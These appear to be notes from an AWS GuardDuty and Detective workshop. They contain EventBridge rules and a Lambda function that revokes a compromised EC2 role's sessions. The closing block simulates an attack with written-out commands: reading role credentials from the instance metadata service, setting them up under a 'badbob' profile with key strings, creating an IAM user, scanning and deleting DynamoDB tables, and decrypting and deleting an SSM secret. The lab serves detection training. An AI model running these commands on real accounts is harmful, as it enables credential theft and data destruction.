# Threat Detection and Response

Workshop guide
[Threat Detection and Response with Amazon GuardDuty and Amazon Detective](https://catalog.workshops.aws/guardduty/en-US)



Get the IAM Credential of an EC2 instance



EventBridge Pattern

```bash
{
  "source": ["aws.securityhub"],
  "detail": {
    "findings": {
      "ProductName": ["GuardDuty"],
      "Severity": {
        "Label": ["MEDIUM", "HIGH"]
      },
      "Resources": {
        "Type": ["AwsEc2Instance"],
        "Tags": {
          "ENV": ["PROD"]
        }
      }
    }
  }
}
```

```bash
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "ec2:*",
                "ec2:Describe*",
                "ec2:ModifyInstanceAttribute",
                "ec2:CreateSecurityGroup",
                "ec2:AuthorizeSecurityGroupIngress"
            ],
            "Resource": "*",
            "Effect": "Allow"
        }
    ]
}

```

EventBridge pattern targeting gaurdduty event

```bash
{
  "source": ["aws.guardduty"],
  "detail": {
    "type": ["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS"]
  }
}
```

Lambda Function to automation revoking IAM Role

```bash
from __future__ import print_function
from botocore.exceptions import ClientError
import json
import datetime
import boto3
import os

def handler(event, context):

  # Log out event
  print("log -- Event: %s " % json.dumps(event))

  # Create generic function response
  response = "Error auto-remediating the finding."

  try:

    # Set Clients
    iam = boto3.client('iam')
    ec2 = boto3.client('ec2')

    # Set Role Variable
    role = event['detail']['resource']['accessKeyDetails']['userName']

    # Current Time
    time = datetime.datetime.utcnow().isoformat()

    # Set Revoke Policy
    policy = """
      {
        "Version": "2012-10-17",
        "Statement": {
          "Effect": "Deny",
          "Action": "*",
          "Resource": "*",
          "Condition": {"DateLessThan": {"aws:TokenIssueTime": "%s"}}
        }
      }
    """ % time

    # Add policy to Role to Revoke all Current Sessions
    iam.put_role_policy(
      RoleName=role,
      PolicyName='RevokeOldSessions',
      PolicyDocument=policy.replace('\n', '').replace(' ', '')
    )

    # Send Response Email
    response = "GuardDuty Remediation | ID:%s: GuardDuty discovered EC2 IAM credentials (Role: %s) being used outside of the EC2 service.  All sessions have been revoked.  Please follow up with any additional remediation actions." % (event['detail']['id'], role)
    sns = boto3.client('sns')
    sns.publish(
      TopicArn=os.environ['TOPIC_ARN'],
      Message=response
    )
  except ClientError as e:
    print(e)

  print("log -- Response: %s " % response)
  return response
```

The lambda function above will inject the below IAM policy into the roles to revoke active sessions. Until the instance is restarted it cannot perform legitimate IAM api calls.

```bash
{
    "Version": "2012-10-17",
    "Statement": {
        "Effect": "Deny",
        "Action": "*",
        "Resource": "*",
        "Condition": {
            "DateLessThan": {
                "aws:TokenIssueTime": "2023-04-15T00:45:03.446581"
            }
        }
    }
}
```

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GDWorkshop-EC2-Compromised  # The securitty for this credential is now compromised

# Execute the following command in another machine from which you want to compromise the instance
aws configure set profile.badbob.region us-east-1
aws configure set profile.badbob.aws_access_key_id ASIASNJTWRRL3FTDOVWU
aws configure set profile.badbob.aws_secret_access_key CHAwBI2SqGiYu3ul9mrH2497IvPlP5sMCyeg+aMT
aws configure set profile.badbob.aws_session_token IQoJb3Jp.....Token-String...

# Begin acting as the iam user
aws sts get-caller-identity --profile badbob
aws iam create-user --user-name Chuck --profile badbob
aws dynamodb list-tables --profile badbob
aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB-Detective --profile badbob
aws dynamodb scan --table-name GuardDuty-Example-Customer-DB-Detective --profile badbob
aws dynamodb scan --table-name GuardDuty-Example-Customer-DB --profile badbob
aws dynamodb delete-table --table-name GuardDuty-Example-Customer-DB --profile badbob
aws dynamodb list-tables --profile badbob
aws ssm describe-parameters --profile badbob
aws ssm get-parameters --names "gd_prod_dbpwd_sample" --profile badbob
aws ssm get-parameters --names "gd_prod_dbpwd_sample" --with-decryption --profile badbob
aws ssm delete-parameter --name "gd_prod_dbpwd_sample" --profile badbob

```
